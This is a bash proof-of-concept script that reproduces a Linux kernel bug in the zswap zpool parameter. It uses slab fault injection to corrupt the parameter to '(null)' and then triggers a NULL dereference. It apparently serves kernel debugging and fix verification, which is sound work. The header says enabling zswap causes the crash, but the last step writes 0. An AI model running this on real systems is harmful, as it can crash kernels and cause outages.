#!/bin/bash
# Minimal PoC for the zswap charp parameter corruption bug.
#
# Run as root in a kernel booted with zswap.enabled=0.
# Required config: CONFIG_ZSWAP, CONFIG_DEBUG_FS, CONFIG_FAULT_INJECTION,
# CONFIG_FAULT_INJECTION_DEBUG_FS, and CONFIG_FAILSLAB.
#
# The script uses failslab + /proc/self/task/$tid/fail-nth to fail allocations
# while rewriting the zswap zpool charp parameter with its current value. A
# vulnerable kernel corrupts zpool to "(null)"; enabling zswap then triggers a
# NULL dereference through zpool_get_driver(). A fixed kernel keeps the old
# zpool value and the script exits without corrupting it.

DEBUGFS=/sys/kernel/debug
FAILSLAB=${DEBUGFS}/failslab
ZSWAP_PARAMS=/sys/module/zswap/parameters
FAIL_NTH=/proc/self/task/$$/fail-nth
MAX_FAIL_NTH=${MAX_FAIL_NTH:-64}

mount -t debugfs none "${DEBUGFS}" 2>/dev/null

echo "== before =="
cat "${ZSWAP_PARAMS}/enabled"
cat "${ZSWAP_PARAMS}/zpool"
cat "${ZSWAP_PARAMS}/compressor"

old_zpool=$(cat "${ZSWAP_PARAMS}/zpool")

echo "== configure failslab for fail-nth =="
echo N > "${FAILSLAB}/ignore-gfp-wait"
echo 0 > "${FAILSLAB}/verbose"

echo "== find the slab allocation used by the zpool parameter update =="
for nth in $(seq 1 "${MAX_FAIL_NTH}"); do
	exec 3> "${ZSWAP_PARAMS}/zpool"
	echo "${nth}" > "${FAIL_NTH}"
	printf '%s\n' "${old_zpool}" >&3 2>/dev/null
	write_rc=$?
	echo 0 > "${FAIL_NTH}"
	exec 3>&-

	new_zpool=$(cat "${ZSWAP_PARAMS}/zpool" 2>/dev/null || echo "<unreadable>")

	printf 'fail-nth=%s write_rc=%s zpool=%s\n' \
		"${nth}" "${write_rc}" "${new_zpool}"

	if [ "${new_zpool}" != "${old_zpool}" ]; then
		echo "corrupted zpool: old='${old_zpool}' new='${new_zpool}'"
		break
	fi
done

if [ "${new_zpool}" = "${old_zpool}" ]; then
	echo "failed to corrupt zpool within MAX_FAIL_NTH=${MAX_FAIL_NTH}"
	exit 1
fi

echo "== trigger zswap setup with the corrupted zpool value =="
echo 0 > "${ZSWAP_PARAMS}/enabled"

echo "== after =="
cat "${ZSWAP_PARAMS}/enabled"
cat "${ZSWAP_PARAMS}/zpool"
cat "${ZSWAP_PARAMS}/compressor"
